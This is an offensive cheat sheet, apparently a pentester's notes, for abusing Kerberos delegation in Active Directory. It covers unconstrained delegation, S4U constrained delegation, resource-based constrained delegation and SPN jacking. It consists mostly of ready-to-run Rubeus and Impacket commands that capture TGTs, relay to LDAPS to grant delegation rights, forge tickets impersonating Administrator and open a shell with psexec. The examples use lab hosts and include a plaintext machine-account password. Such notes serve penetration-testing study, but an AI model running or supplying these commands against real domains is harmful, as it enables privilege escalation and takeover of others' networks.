#ad #kerberos #delegation #rbcd #s4u

# Kerberos Delegation Attacks

Unconstrained, constrained, and resource-based constrained delegation (RBCD). Related: [kerberos-tickets](kerberos-tickets.md) · [dacl-attacks](dacl-attacks.md) · [ntlm-relay](ntlm-relay.md) · [enumeration](enumeration.md)

## Contents
- [Enumerate Delegation](#enumerate-delegation)
- [Unconstrained Delegation (capture TGTs)](#unconstrained-delegation-capture-tgts)
- [Constrained Delegation (S4U)](#constrained-delegation-s4u)
- [Resource-Based Constrained Delegation (RBCD)](#resource-based-constrained-delegation-rbcd)
- [SPN Jacking / tgssub](#spn-jacking--tgssub)

## Delegation Abuse Chains

```mermaid
flowchart TD
    subgraph "Unconstrained Delegation"
    U1["Get-DomainComputer -Unconstrained\n(find the vulnerable host)"] --> U2["Rubeus.exe monitor /interval:5\n(wait for a privileged TGT to land)"]
    U2 --> U3["Extract captured TGT → impersonate that user"]
    end
    subgraph "Constrained Delegation (S4U)"
    C1["Get-DomainComputer -TrustedToAuth / findDelegation.py\n(find msDS-AllowedToDelegateTo)"] --> C2["S4U2self: forge a ticket to self as the target user"]
    C2 --> C3["S4U2proxy: exchange it for a service ticket to the allowed SPN\nRubeus s4u /ptt or getST.py -impersonate"]
    C3 --> C4["Access the service as the impersonated user"]
    end
    subgraph "Resource-Based Constrained Delegation"
    R1["Compromise or create a computer account\n(write access to msDS-AllowedToActOnBehalfOfOtherIdentity)"] --> R2["ntlmrelayx.py --delegate-access\n(grant RBCD rights to a controlled account)"]
    R2 --> R3["getST.py -spn <target_SPN> -impersonate Administrator"]
    R3 --> R4["Use the forged ticket for a shell (psexec.py -k -no-pass)"]
    end
```



## Enumerate Delegation
```powershell
.\SharpView.exe Get-DomainComputer -Unconstrained
```
Find computers with unconstrained delegation.

```powershell
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
```
Find computers with constrained delegation.

```bash
findDelegation.py inlanefreight.local/pixis
```
List accounts with delegation (Linux, Impacket).

## Unconstrained Delegation (capture TGTs)
```cmd
Rubeus.exe monitor /interval:5
```
Monitor for TGTs arriving every 5 seconds.

```cmd
Rubeus.exe monitor /interval:5 /nowrap
```
Monitor Kerberos tickets (no line wrapping).

> [!NOTE]
> Unconstrained delegation only pays off once a privileged account (ideally a DC machine account, via a coercion like PetitPotam/PrinterBug — see [ntlm-relay](ntlm-relay.md)) authenticates to the compromised host while `Rubeus monitor` is running.

## Constrained Delegation (S4U)
```cmd
Rubeus.exe s4u /impersonateuser:<User> /msdsspn:<SPN> /altservice:<SRV> /user:<USR> /rc4:<NT Hash> /ptt
```
Perform an S4U2self/S4U2proxy attack (Windows).

```bash
getST.py -spn <SPN> -hashes :<NT Hash> 'domain/user' -impersonate <user>
```
Perform an S4U attack (Linux, Impacket).

```cmd
.\Rubeus.exe s4u /self /impersonateuser:<USER> /altservice:"<SERVICE>" /dc:<DC_IP> /ptt /ticket:<TICKET>
```
Obtain a service ticket via S4U2self.

## Resource-Based Constrained Delegation (RBCD)
```bash
ntlmrelayx.py -t ldaps://INLANEFREIGHT\\'SQL01$'@172.16.117.3 --delegate-access --escalate-user 'plaintext$' --no-smb-server --no-dump
```
Relay to LDAPS and grant RBCD rights. See [ntlm-relay](ntlm-relay.md).

```bash
getST.py -spn cifs/sql01.inlanefreight.local -impersonate Administrator -dc-ip 172.16.117.3 "INLANEFREIGHT"/"plaintext$":"o6@ekK5#rlw2rAe"
```
Request an impersonation ticket via RBCD.

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass sql01.inlanefreight.local
```
Use the forged ticket to get a shell (Impacket). See [lateral-movement](../Windows/lateral-movement.md).

## SPN Jacking / tgssub
```cmd
.\Rubeus.exe tgssub /ticket:<BASE64> /altservice:<SERVICE>
```
Alter the service name/hostname of a ticket.

```bash
proxychains4 -q python3 tgssub.py -in <TICKET_FILE> -altservice "<SERVICE>" -out <NEW_TICKET_FILE>
```
Modify a ticket's service name (Linux).

```bash
describeTicket.py <TICKET_FILE>
```
Describe a ticket's contents (Impacket).
